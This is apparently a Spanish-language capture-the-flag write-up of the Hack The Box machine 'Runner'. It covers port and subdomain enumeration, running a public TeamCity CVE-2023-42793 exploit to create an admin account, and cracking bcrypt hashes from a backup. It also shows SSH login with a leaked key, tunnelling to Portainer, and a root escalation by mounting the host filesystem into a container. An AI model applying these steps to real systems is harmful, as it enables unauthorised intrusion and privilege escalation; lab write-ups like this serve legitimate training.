---
layout: single
title: Hack The Box - Runner
excerpt: "**Runner** es una máquina de la plataforma Hack The Box de dificultad media que aborda temas como la explotación de tecnologías como TeamCity y Portainer, así como tunneling. La clave para su explotación radica en la enumeración."
date: 2025-05-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-Runner/runner.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Web Pentesting
tags:  
  - CVE-2023-42793
  - Tunneling
  - Portainer
---


<style>
body
{
  margin: 0;
  padding: 0;
}

.glitch
  {
    position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-Runner/runner.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
 }

.glitch:before
  {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-Runner/runner.png");
    background-size: cover; /* contain for split effect */
    opacity: .5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

.glitch:hover:before
{
  animation: glitch1 1s linear infinite;
}

@keyframes glitch1
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 5px 0;
  }
  20%
  {
    background-position: -5px 0;
  }
  30%
  {
    background-position: 15px 0;
  }
  40%
  {
    background-position: -5px 0;
  }
  50%
  {
    background-position: -25px 0;
  }
  60%
  {
    background-position: -50px 0;
  }
  70%
  {
    background-position: 0 -20px;
  }
  80%
  {
    background-position: -60px -20px;
  }
  81%
  {
    background-position: 0 0;
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(360deg);
  }
}

@keyframes glitch2
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 15px 0;
  }
  15%
  {
    background-position: -15px 0;
  }
  20%
  {
    filter: hue-rotate(360deg);
  }
  25%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
}

@media (max-width: 767.5px) {

.glitch{
position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-Runner/runner.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


@media (max-width: 575.5px) { 

.glitch{
position: relative;
    width: 50%;
    height: 25vh;
    background-image:url("/assets/images/htb-writeup-Runner/runner.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


</style>
<body>
    <div class="glitch">  
    </div>
</body>

<br>

**Runner** es una máquina de la plataforma Hack The Box de dificultad media que aborda temas como la explotación de tecnologías como TeamCity y Portainer, así como tunneling. La clave para su explotación radica en la enumeración.

## Enumeración
Realicé un escaneo de puertos con la herramienta **Nmap** e identifiqué los siguientes puertos abiertos:<br>
- 22 SSH
- 80 HTTP 
- 8000 nagios-nsca

```bash
Nmap scan report for 10.10.11.13
Host is up, received user-set (0.11s latency).
Scanned at 2024-06-03 15:26:40 EDT for 8s

PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca syn-ack ttl 63 Nagios NSCA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Realicé un nuevo escaneo con **Nmap** utilizando la opción `-sVC` para obtener información detallada de los servicios detectados, y logré identificar el dominio: **runner.htb**.

```bash
Nmap scan report for 10.10.11.13
Host is up, received user-set (0.11s latency).
Scanned at 2024-06-03 15:33:23 EDT for 11s

PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http        syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
8000/tcp open  nagios-nsca syn-ack ttl 63 Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Posteriormente, agregué el dominio al archivo **/etc/hosts**, apuntándolo a la IP de la máquina víctima para poder visualizar correctamente la página web.

```bash
┌──(root㉿kali)-[/]
└─# cat /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.13    runner.htb
```

## Enumeración Web

El sitio web que estaba alojado en la máquina era el siguiente:

![](/assets/images/htb-writeup-Runner/web.png)

Para obtener más información acerca de las tecnologías empleadas en el sitio web utilicé la herramienta **whatweb**.

```bash
┌──(root㉿kali)-[/]
└─# whatweb http://runner.htb/
http://runner.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sales@runner.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.13], JQuery[3.5.1], PoweredBy[TeamCity!], Script, Title[Runner - CI/CD Specialists], X-UA-Compatible[IE=edge], nginx[1.18.0]
```
Después de enumerar la página web, no encontré nada relevante, por lo que procedí a realizar una enumeración de subdominios, donde logré identificar uno.


```bash
ffuf -w /opt/subdomains-10000.txt -u http://runner.htb/ -H "HOST: FUZZ.runner.htb" -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb/
 :: Wordlist         : FUZZ: /opt/subdomains-10000.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

[Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 131ms]
    * FUZZ: teamcity

:: Progress: [9985/9985] :: Job [1/1] :: 283 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```
Posteriormente, lo añadí a mi archivo /etc/hosts y al consultar el subdominio en el navegador identifiqué un login de TeamCity.

```bash
┌──(root㉿kali)-[/]
└─# cat /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.13    runner.htb teamcity.runner.htb
```

![](/assets/images/htb-writeup-Runner/team.png)

Después de una búsqueda, identifiqué un exploit que afecta a esta versión de TeamCity, el cual permite crear una cuenta de usuario administrador. [https://github.com/Zyad-Elsayed/CVE-2023-42793] 


```bash
┌──(root㉿kali)-[~/HTB/BOX/runner/CVE-2023-42793]
└─# python3 CVE-2023-42793.py -u http://teamcity.runner.htb/ 
[+] http://teamcity.runner.htb/login.html [H454NSec3496:@H454NSec]

```
Una vez que creé la cuenta como administrador, ingresé al portal.

![](/assets/images/htb-writeup-Runner/dash.png)

Revisando la página web, identifiqué una opción interesante **Backup**, la cual generó un archivo ZIP.

![](/assets/images/htb-writeup-Runner/backup.png)

Al revisar el Backup, identifiqué los hashes de las contraseñas de los usuarios del portal. 

```bash
┌──(root㉿kali)-[~/HTB/BOX/runner/team]
└─# grep -Ri matthew
config/_trash/AllProjects.project1/project-config.xml:  <description>Matthew's projects</description>
config/projects/AllProjects/project-config.xml.1:  <description>Matthew's projects</description>
system/pluginData/audit/configHistory/projects/project1/config.xml.1:  <description>Matthew's projects</description>
database_dump/vcs_username:2, anyVcs, -1, 0, matthew
database_dump/users:2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
```
```bash
┌──(root㉿kali)-[~/HTB/BOX/runner/team]
└─# cat database_dump/users 
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1717252745534, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, h454nsec7498, $2a$07$pmV.RBy40fx1mZC5rf9dHuVicmfhZ7e8XAHpyc7oWDEF8XnMFZeyW, , "", 1717252763525, BCRYPT

```
 Con John the Ripper, pude romper el hash de Mathew. Sin embargo, no pude iniciar sesión en la máquina mediante SSH con estas credenciales.

```bash
┌──(root㉿kali)-[~/…/BOX/runner/team/database_dump]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 128 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
piper123         (?)     
1g 0:00:00:53 DONE (2024-06-03 16:23) 0.01873g/s 975.0p/s 975.0c/s 975.0C/s playboy93..onelife
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Adicionalmente, en el backup, encontré una llave SSH con la cual pude ingresar como el usuario "john", que es el nombre del usuario administrador según el portal

```bash
┌──(root㉿kali)-[~/HTB/BOX/runner/team]
└─# find . -name "id_rsa"

./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
```

```bash
┌──(root㉿kali)-[~/HTB/BOX/runner]
└─# ssh -i id_rsa john@10.10.11.13                       

Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Mon Jun  3 08:35:42 PM UTC 2024

  System load:  0.150390625       Users logged in:                  1
  Usage of /:   83.4% of 9.74GB   IPv4 address for br-21746deff6ac: 172.18.0.1
  Memory usage: 61%               IPv4 address for docker0:         172.17.0.1
  Swap usage:   3%                IPv4 address for eth0:            10.10.11.13
  Processes:    262


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jun  3 20:15:48 2024 from 10.10.14.194
john@runner:~$ 
```

## Escalada de privilegios

Enumerando la máquina, identifiqué que internamente tenía el puerto 9000 abierto. Al realizar una consulta con `curl`, pude ver que se trataba de la ejecución interna de **Portainer**.

```bash
john@runner:~$ netstat -natp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:56748         127.0.0.1:8111          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:50808         127.0.0.1:8111          TIME_WAIT   -                   
tcp        0      0 127.0.0.1:44248         127.0.0.1:8111          TIME_WAIT   -                   
tcp        0      0 10.10.11.13:22          10.10.14.51:54668       ESTABLISHED -                   
tcp        0      0 172.17.0.1:57030        172.17.0.2:8111         TIME_WAIT   -                   
tcp        0      0 127.0.0.1:8111          127.0.0.1:45480         TIME_WAIT   -                   
tcp        0      0 10.10.11.13:22          10.10.14.194:43764      ESTABLISHED -                   
tcp        0      0 127.0.0.1:8111          127.0.0.1:56756         TIME_WAIT   -                   
tcp        0      0 127.0.0.1:39082         127.0.0.1:8111          TIME_WAIT   -                   
tcp        0      0 172.17.0.1:37196        172.17.0.2:8111         TIME_WAIT   -                   
tcp        0      0 10.10.11.13:22          10.10.14.51:33326       ESTABLISHED -                   
tcp        0      0 127.0.0.1:45464         127.0.0.1:8111          TIME_WAIT   -                   
tcp        0      1 10.10.11.13:35956       8.8.8.8:53              SYN_SENT    -                   
tcp        0      0 172.17.0.1:33810        172.17.0.2:8111         TIME_WAIT   -                   
tcp        0      0 127.0.0.1:56994         127.0.0.1:8111          TIME_WAIT   -                   
tcp        0    248 10.10.11.13:22          10.10.14.129:46938      ESTABLISHED -                   
tcp        0      0 10.10.11.13:22          10.10.14.118:58318      ESTABLISHED -                   
tcp        0      0 127.0.0.1:8111          127.0.0.1:50796         TIME_WAIT   -                   
tcp        0      0 10.10.11.13:80          10.10.14.129:53586      ESTABLISHED -                   
tcp        0      0 172.17.0.1:56096        172.17.0.2:8111         TIME_WAIT   -                   
tcp        0      0 172.17.0.1:51828        172.17.0.2:8111         TIME_WAIT   -                   
tcp        0      0 127.0.0.1:8111          127.0.0.1:39066         TIME_WAIT   -                   
tcp        0      0 172.17.0.1:44512        172.17.0.2:8111         TIME_WAIT   -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

```bash
john@runner:~$ curl http://127.0.0.1:9000/
<!doctype html><html lang="en" ng-app="portainer" ng-strict-di data-edition="CE"><head><meta charset="utf-8"/><title>Portainer</title><meta name="description" content=""/><meta name="author" content="Portainer.io"/><meta http-equiv="cache-control" content="no-cache"/><meta http-equiv="expires" content="0"/><meta http-equiv="pragma" content="no-cache"/><base id="base"/><script>if (window.origin == 'file://') {
        // we are loading the app from a local file as in docker extension
        document.getElementById('base').href = 'http://localhost:49000/';
```
En este punto, intenté establecer un túnel con **chisel**; sin embargo, por alguna razón, no pude ejecutarlo en la máquina así que utilicé SSH para hacer el túnel. con el sig. comando: 

```bash
ssh -i id_rsa -L 9000:127.0.0.1:9000 john@10.10.11.13
```
```bash
┌──(root㉿kali)-[/opt/chisel]
└─# lsof -i:9000
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     160292 root    4u  IPv6 637463      0t0  TCP localhost:9000 (LISTEN)
ssh     160292 root    5u  IPv4 637464      0t0  TCP localhost:9000 (LISTEN)
```
![](/assets/images/htb-writeup-Runner/port.png)

Pude ingresar al portal con las credenciales de Mathew, identificadas en el backup realizado anteriormente en TeamCity. matthew:piper123

![](/assets/images/htb-writeup-Runner/dash2.png)

En este punto, primero creé un volumen con las siguientes características:

![](/assets/images/htb-writeup-Runner/vol.png)

Después, creé un contenedor utilizando una de las imágenes existentes (`teamcity:latest`). Como consola, especifiqué `tty`. Finalmente, en la configuración de volumen, utilicé el volumen que creé previamente y en contenedor especifique `/mnt/root` para montar todo el directorio de archivos de root en `/mnt`.

![](/assets/images/htb-writeup-Runner/vol3.png)

![](/assets/images/htb-writeup-Runner/vol4.png)

Una vez creado el contenedor accedí a el y me conecte utilizando la opción console  especificando el usuario en este caso root

![](/assets/images/htb-writeup-Runner/vol5.png)

![](/assets/images/htb-writeup-Runner/vol6.png)

```bash
7905a1c079root@0faf18fb27ae:/mnt/root# cd /mnt/root/; ls -la
total 88
drwxr-xr-x  19 root root  4096 Apr  4 10:24 .
drwxr-xr-x   1 root root  4096 Jun  3 21:19 ..
lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Apr 15 09:44 boot
drwxr-xr-x   9 root root  4096 Feb 28 10:31 data
drwxr-xr-x   4 root root  4096 Feb 17  2023 dev
drwxr-xr-x 101 root root  4096 Apr 15 09:35 etc
drwxr-xr-x   4 root root  4096 Apr  4 10:24 home
lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Apr 27  2023 lost+found
drwxr-xr-x   2 root root  4096 Feb 17  2023 media
drwxr-xr-x   2 root root  4096 Feb 17  2023 mnt
drwxr-xr-x   4 root root  4096 Apr  4 10:24 opt
drwxr-xr-x   2 root root  4096 Apr  4 10:24 proc
drwx------   6 root root  4096 Jun  3 15:31 root
drwxr-xr-x  14 root root  4096 Apr  4 10:24 run
lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Apr  4 10:24 srv
drwxr-xr-x   2 root root  4096 Apr 18  2022 sys
drwxrwxrwt   8 root root  4096 Jun  3 21:21 tmp
drwxr-xr-x  14 root root  4096 Feb 17  2023 usr
drwxr-xr-x  13 root root  4096 Feb 28 10:07 var
root@0faf18fb27ae:/mnt/root# cat root/root.txt 
7905a1c079204da66e79af6834ffc527
```



